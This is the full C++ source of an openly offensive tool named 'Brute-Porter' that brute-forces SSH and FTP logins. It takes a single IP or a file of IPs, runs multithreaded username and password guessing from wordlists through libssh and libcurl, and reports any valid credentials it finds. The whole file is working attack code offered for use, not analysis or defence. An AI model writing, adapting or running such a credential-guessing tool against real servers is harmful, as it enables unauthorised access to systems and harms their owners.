#include <iostream>
#include <fstream>
#include <unistd.h>
#include <vector>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <libssh/libssh.h>
#include <thread>
#include <mutex>
#include <atomic>
#include <curl/curl.h>
#include <cctype>

using namespace std;

// Global Variables
vector<std::thread> threads;
atomic<bool> found(false);
atomic<int> checkedCount(0);
atomic<int> validCount(0);
atomic<int> badCount(0);
mutex statsMutex;

// RESET
#define RESET   "\033[0m"

// BOLD + BRIGHT COLORS
#define RED     "\033[1;91m"
#define GREEN   "\033[1;92m"
#define YELLOW  "\033[1;93m"
#define BLUE    "\033[1;94m"
#define CYAN    "\033[1;96m"
#define WHITE   "\033[1;97m"

string trim(const string& value) {
    size_t start = value.find_first_not_of(" \t\r\n");
    if (start == string::npos) return "";
    size_t end = value.find_last_not_of(" \t\r\n");
    return value.substr(start, end - start + 1);
}

void waitAndClearThreads() {
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
    threads.clear();
}

vector<string> loadTargetsFromFile(const string& filePath) {
    vector<string> targets;
    ifstream file(filePath);
    string line;

    if (!file) {
        cerr << RED << "[-] Can't open ip list file: " << filePath << RESET << endl;
        return targets;
    }

    while (getline(file, line)) {
        string ip = trim(line);
        if (!ip.empty()) {
            targets.push_back(ip);
        }
    }

    return targets;
}

void resetStats() {
    checkedCount = 0;
    validCount = 0;
    badCount = 0;
}

void showStats() {
    lock_guard<mutex> lock(statsMutex);
    cout << "\r" << CYAN << "check: " << checkedCount.load()
         << WHITE << "  valid: " << GREEN << validCount.load()
         << WHITE << "  bad: " << RED << badCount.load()
         << RESET << flush;
}

void finalizeStatsLine() {
    showStats();
    cout << endl;
}

void updateStats(bool success) {
    checkedCount++;
    if (success) validCount++;
    else badCount++;
    showStats();
}

bool ftpBrute(const string& username, const string& password, const string& ip, int port) {
    if (found) return false;

    CURL *curl;
    CURLcode res;
    string ftp_url = "ftp://" + ip + ":" + to_string(port) + "/";
    string userpass = username + ":" + password;

    curl = curl_easy_init();
    if (!curl) {
        updateStats(false);
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_URL, ftp_url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERPWD, userpass.c_str());
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);

    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    const bool success = (res == CURLE_OK);
    updateStats(success);
    if (success) {
        cout << "\n" << GREEN << "[+] Success => " << username << ":" << password << RESET << endl;
        found = true;
        return true;
    }
    return false;
}

bool sshBrute(const string& username, const string& password, const string& ip, int port){

  if (found) return false;

  ssh_session session = ssh_new();
  if (!session) {
    updateStats(false);
    return false;
  }

  ssh_options_set(session,SSH_OPTIONS_HOST,ip.c_str());
  ssh_options_set(session,SSH_OPTIONS_PORT,&port);
  ssh_options_set(session,SSH_OPTIONS_USER,username.c_str());

  int rc = ssh_connect(session);
  if (rc != SSH_OK) {
    ssh_free(session);
    updateStats(false);
    return false;
  }

  rc = ssh_userauth_password(session,nullptr,password.c_str());
  if (rc == SSH_AUTH_SUCCESS) {
    found = true;
    ssh_disconnect(session);
    ssh_free(session);
    updateStats(true);
    cout << "\n" << GREEN << "[+] Success => " << username << ":" << password << RESET << endl;
    return true;
  }
  ssh_disconnect(session);
  ssh_free(session);
  updateStats(false);
  return false;
}

int banner() {
    system("clear");
    cout << WHITE << "__________________________________________________________________" << endl;
    cout << CYAN << R"(

    dBBBBb dBBBBBb    dBP dBP dBBBBBBP dBBBP     
       dBP     dBP                               
   dBBBK'  dBBBBK   dBP dBP    dBP   dBBP        
  dB' db  dBP  BB  dBP_dBP    dBP   dBP          
 dBBBBP' dBP  dB' dBBBBBP    dBP   dBBBBP        
                                                 
   dBBBBBb  dBBBBP dBBBBBb dBBBBBBP dBBBP dBBBBBb
       dB' dBP.BP      dBP                    dBP
   dBBBP' dBP.BP   dBBBBK   dBP   dBBP    dBBBBK 
  dBP    dBP.BP   dBP  BB  dBP   dBP     dBP  BB 
 dBP    dBBBBP   dBP  dB' dBP   dBBBBP  dBP  dB' 
                                                 

    )" << endl;

    cout << GREEN << "[*] Tool Name : Brute-Porter" << endl;
    cout << GREEN << "[*] Author    : William Steven" << endl;
    cout << GREEN << "[*] GitHub    : https://github.com/Anon-404" << endl;
    cout << GREEN << "[*] Type      : SSH & FTP Brute forcer Tool" << endl;
    cout << WHITE << "__________________________________________________________________" << endl;

    return 0;
}

void bruteWithUserListOnly(const string& ip, int port, int service, const string& filename, const string& password, int maxThread) {
    found = false;
    resetStats();
    ifstream file(filename);
    string username;

    if (!file) {
        cout << RED << "[-] Can't open file: " << filename << RESET << endl;
        return;
    }

    cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
    cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
    cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;

    while (getline(file, username)) {
        if (username.empty()) continue;

        if (service == 1) {
            threads.emplace_back(sshBrute, username, password, ip, port);
        } else if (service == 2) {
            threads.emplace_back(ftpBrute, username, password, ip, port);
        }

        if (threads.size() >= static_cast<size_t>(maxThread)) {
            waitAndClearThreads();
            if (found) break;
        }
    }

    waitAndClearThreads();

    if (!found.load()) {
        cout << RED << "[-] No valid credential found" << RESET << endl;
    }
    finalizeStatsLine();

    file.close();
}


void bruteWithPassListOnly(const string& ip, int port, int service, const string& filename, const string& username, int maxThread) {
    found = false;
    resetStats();
    ifstream file(filename);
    string password;

    if (!file) {
        cout << RED << "[-] Can't open file: " << filename << RESET << endl;
        return;
    }

    cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
    cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
    cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;

    while (getline(file, password)) {
        if (password.empty()) continue;

        if (service == 1) {
            threads.emplace_back(sshBrute, username, password, ip, port);
        } else if (service == 2) {
            threads.emplace_back(ftpBrute, username, password, ip, port);
        }

        if (threads.size() >= static_cast<size_t>(maxThread)) {
            waitAndClearThreads();
            if (found) break;
        }
    }

    waitAndClearThreads();

    if (!found.load()) {
        cout << RED << "[-] No valid credential found" << RESET << endl;
    }
    finalizeStatsLine();

    file.close();
}



void bruteWithUserAndPassList(const string& ip, int port, int service, const string& userfile, const string& passfile, int maxThread) {
    found = false;
    resetStats();
    string username, password;
    ifstream ufile(userfile);
    ifstream pfile(passfile);

    if (!ufile || !pfile) {
        cout << RED << "[-] Can't open one or both files" << RESET << endl;
        return;
    }

    cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
    cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
    cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;

    while (getline(ufile, username)) {
        if (username.empty()) continue;

        pfile.clear();
        pfile.seekg(0);

        while (getline(pfile, password)) {
            if (password.empty()) continue;

            if (service == 1) {
                threads.emplace_back(sshBrute, username, password, ip, port);
            } else if (service == 2) {
                threads.emplace_back(ftpBrute, username, password, ip, port);
            }

            if (threads.size() >= static_cast<size_t>(maxThread)) {
                waitAndClearThreads();
                if (found) break;
            }
        }

        if (found) break;
    }

    waitAndClearThreads();

    if (!found.load()) {
        cout << RED << "[-] No valid credential found" << RESET << endl;
    }
    finalizeStatsLine();

    ufile.close();
    pfile.close();
}


int main () {

    banner();

    vector<string> targets;
    string ip, ipListPath;
    int targetMode, port, service, mode, maxThread;
    string userFile, passFile, username, password;

    cout << CYAN << "\n[!] Target Input Mode\n\n";
    cout << BLUE << "[1] Single IP\n";
    cout << BLUE << "[2] IP list file (one IP per line)\n";
    cout << YELLOW << "\n[?] Choose target input mode (1-2): ";
    cin >> targetMode;

    if (targetMode == 1) {
        cout << YELLOW << "[?] Enter target IP: ";
        cin >> ip;
        targets.push_back(trim(ip));
    } else if (targetMode == 2) {
        cout << YELLOW << "[?] Enter ip list file path: ";
        cin >> ipListPath;
        targets = loadTargetsFromFile(ipListPath);
        if (targets.empty()) {
            cout << RED << "[-] No valid IPs found in file" << RESET << endl;
            return 1;
        }
    } else {
        cout << RED << "[-] Invalid target input mode!" << RESET << endl;
        return 1;
    }

    // Service selection
    cout << CYAN << "\n[!] Choose Target Service\n\n";
    cout << BLUE << "[1] SSH\n";
    cout << BLUE << "[2] FTP\n";
    cout << YELLOW << "\n[?] Enter service option (1-2): ";
    cin >> service;

    if (service < 1 || service > 2) {
        cout << RED << "[-] Invalid service selection!" << RESET << endl;
        return 1;
    }

    // Port Suggestion
    cout << CYAN << "[!] Suggested Port: ";
    switch(service) {
        case 1: cout << "22"; break;
        case 2: cout << "21"; break;
    }
    cout << RESET << endl;

    cout << YELLOW << "[?] Enter port number: ";
    cin >> port;

    cout << CYAN << "\n[!] Mode selection\n\n";
    cout << BLUE << "[1] Username Brute-force\n";
    cout << BLUE << "[2] Password Brute-force\n";
    cout << BLUE << "[3] Both Unknown (Use wordlists)\n";
    cout << YELLOW << "\n[?] Choose brute-force mode (1-3): ";
    cin >> mode;

    if (mode < 1 || mode > 3) {
        cout << RED << "[-] Wrong mode number!" << RESET << endl;
        return 1;
    }

    if (mode == 1) {
        cout << YELLOW << "[?] Wordlist file path (userlist): ";
        cin >> userFile;
        cout << YELLOW << "[?] Enter password: ";
        cin >> password;
    } else if (mode == 2) {
        cout << YELLOW << "[?] Wordlist file path (passlist): ";
        cin >> passFile;
        cout << YELLOW << "[?] Enter username: ";
        cin >> username;
    } else {
        cout << YELLOW << "[?] Wordlist file path (userlist): ";
        cin >> userFile;
        cout << YELLOW << "[?] Wordlist file path (passlist): ";
        cin >> passFile;
    }

    cout << YELLOW << "\n[?] Max Thread (1-100): ";
    cin >> maxThread;
    if (maxThread < 1) {
        cout << RED << "[-] Max Thread must be at least 1" << RESET << endl;
        return 1;
    }
    if (maxThread > 100) {
        cout << RED << "[-] Max Thread must be <= 100" << RESET << endl;
        return 1;
    }

    if ((mode == 1 || mode == 3)) {
        ifstream testUserFile(userFile);
        if (!testUserFile) {
            cout << RED << "[-] Can't open file: " << userFile << RESET << endl;
            return 1;
        }
    }

    if ((mode == 2 || mode == 3)) {
        ifstream testPassFile(passFile);
        if (!testPassFile) {
            cout << RED << "[-] Can't open file: " << passFile << RESET << endl;
            return 1;
        }
    }

    for (size_t i = 0; i < targets.size(); ++i) {
        const string currentIp = trim(targets[i]);
        if (currentIp.empty()) continue;

        banner();
        cout << CYAN << "[!] Target: " << currentIp << RESET << endl;

        if (mode == 1) {
            bruteWithUserListOnly(currentIp, port, service, userFile, password, maxThread);
        } else if (mode == 2) {
            bruteWithPassListOnly(currentIp, port, service, passFile, username, maxThread);
        } else {
            bruteWithUserAndPassList(currentIp, port, service, userFile, passFile, maxThread);
        }
    }

    return 0;
}